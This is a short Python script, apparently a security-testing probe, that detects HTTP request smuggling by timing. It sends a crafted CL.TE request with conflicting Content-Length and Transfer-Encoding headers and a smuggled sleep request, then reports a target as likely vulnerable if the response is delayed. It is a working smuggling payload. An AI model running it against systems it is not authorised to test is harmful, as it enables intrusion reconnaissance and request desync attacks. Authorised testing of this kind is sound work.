#!/usr/bin/env python3
"""
Timing-based detection (PortSwigger 'Finding HTTP request smuggling').

Send a CL.TE-style request whose smuggled portion asks /api/status.ashx?sleep=6000.
If the back-end desyncs and processes the smuggled request, the *next*
request on the same socket will block ~6s. A non-vulnerable stack returns
immediately.
"""
import socket, sys, time
HOST, PORT = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("127.0.0.1", 8080)

smuggled = f"GET /api/status.ashx?sleep=6000 HTTP/1.1\r\nHost: {HOST}\r\nX: X"
req = (
    "POST /api/echo.ashx HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Length: 4\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "\r\n"
    "1\r\nA\r\n0\r\n\r\n"
    + smuggled
)

s = socket.create_connection((HOST, PORT), timeout=15)
t0 = time.time()
s.sendall(req.encode())
try:
    while True:
        if not s.recv(4096): break
except socket.timeout:
    pass
dt = time.time() - t0
s.close()
print(f"[+] Round-trip: {dt:.2f}s")
print("[!] >5s suggests vulnerable (back-end ran the smuggled sleep)." if dt > 5 else "[ ] Looks normal.")
